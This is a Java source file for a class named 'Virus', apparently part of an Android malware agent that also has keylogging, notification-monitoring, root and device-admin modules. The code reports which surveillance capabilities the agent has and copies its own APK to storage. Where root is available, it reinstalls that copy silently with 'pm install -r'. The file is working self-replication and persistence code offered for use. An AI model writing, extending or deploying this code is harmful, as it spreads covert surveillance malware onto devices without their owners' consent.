package com.hackit.agent;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.util.Locale;

/** Self-replication and persistence reporting. Nothing claims silent install on a non-rooted Android device. */
final class Virus {
    static JSONObject status(Context ctx) {
        JSONObject out = new JSONObject();
        try {
            ApplicationInfo app = ctx.getApplicationInfo();
            PackageInfo info = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0);
            File source = new File(app.sourceDir);
            put(out, "package", ctx.getPackageName());
            put(out, "source_apk", app.sourceDir);
            put(out, "source_apk_bytes", source.length());
            put(out, "source_apk_sha256", sha256(source));
            put(out, "version_name", info.versionName);
            put(out, "version_code", Build.VERSION.SDK_INT >= 28 ? info.getLongVersionCode() : info.versionCode);
            put(out, "rooted", Common.rooted());
            put(out, "root_probe", Root.available());
            put(out, "accessibility", KeyMon.connected());
            put(out, "notification_listener", NotifyMon.connected());
            put(out, "device_admin", Info.admin(ctx));
            put(out, "native", NativeBridge.available());
            put(out, "can_install_unknown", canInstallUnknown(ctx));
            put(out, "can_write_external", canWriteExternal(ctx));
            put(out, "downloads", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath());
        } catch (Throwable exc) {
            put(out, "error", String.valueOf(exc));
        }
        return out;
    }

    static JSONObject replicate(Context ctx, String destination) {
        JSONObject out = new JSONObject();
        try {
            ApplicationInfo app = ctx.getApplicationInfo();
            File source = new File(app.sourceDir);
            File target = destination == null || destination.isEmpty()
                    ? new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                    ctx.getPackageName() + ".apk")
                    : new File(destination);
            if (target.isDirectory()) target = new File(target, source.getName() + ".apk");
            File parent = target.getParentFile();
            if (parent != null && !parent.exists() && !parent.mkdirs()) {
                put(out, "ok", false);
                put(out, "error", "cannot create " + parent);
                return out;
            }
            copy(source, target);
            boolean same = source.length() == target.length() && sha256(source).equals(sha256(target));
            put(out, "ok", same);
            put(out, "source", source.getAbsolutePath());
            put(out, "target", target.getAbsolutePath());
            put(out, "bytes", target.length());
            put(out, "sha256", sha256(target));
            put(out, "byte_identical", same);
        } catch (Throwable exc) {
            put(out, "ok", false);
            put(out, "error", String.valueOf(exc));
        }
        return out;
    }

    static JSONObject propagate(Context ctx, String destination) {
        JSONObject out = replicate(ctx, destination);
        try {
            String target = out.optString("target", "");
            if (!out.optBoolean("ok", false)) return out;
            if (Root.available()) {
                String result = Root.exec("pm install -r " + shellQuote(target));
                boolean installed = result.contains("Success");
                put(out, "install", installed ? "root-installed" : "root-install-failed");
                put(out, "install_output", result.length() > 2048 ? result.substring(0, 2048) : result);
                put(out, "ok", installed);
            } else {
                put(out, "install", "needs-user-consent");
                put(out, "ok", true);
            }
        } catch (Throwable exc) {
            put(out, "install", "failed");
            put(out, "install_error", String.valueOf(exc));
            put(out, "ok", false);
        }
        return out;
    }

    private static void copy(File source, File target) throws Exception {
        try (FileInputStream in = new FileInputStream(source); FileOutputStream out = new FileOutputStream(target)) {
            byte[] buffer = new byte[64 * 1024];
            int read;
            while ((read = in.read(buffer)) > 0) out.write(buffer, 0, read);
            out.flush();
        }
    }

    private static String sha256(File file) {
        try (FileInputStream in = new FileInputStream(file)) {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] buffer = new byte[64 * 1024];
            int read;
            while ((read = in.read(buffer)) > 0) digest.update(buffer, 0, read);
            return hex(digest.digest());
        } catch (Exception exc) {
            return "";
        }
    }

    private static String hex(byte[] data) {
        StringBuilder out = new StringBuilder(data.length * 2);
        for (byte b : data) out.append(String.format(Locale.US, "%02x", b));
        return out.toString();
    }

    private static String shellQuote(String value) {
        return "'" + value.replace("'", "'\\''") + "'";
    }

    private static void put(JSONObject out, String key, Object value) {
        try {
            out.put(key, value);
        } catch (Exception ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private static boolean canInstallUnknown(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= 26) return ctx.getPackageManager().canRequestPackageInstalls();
            return android.provider.Settings.Secure.getInt(ctx.getContentResolver(),
                    android.provider.Settings.Secure.INSTALL_NON_MARKET_APPS, 0) == 1;
        } catch (Throwable exc) {
            return false;
        }
    }

    private static boolean canWriteExternal(Context ctx) {
        try {
            return Build.VERSION.SDK_INT < 23
                    || ctx.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                    || (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager());
        } catch (Throwable exc) {
            return false;
        }
    }

    private Virus() {
    }
}
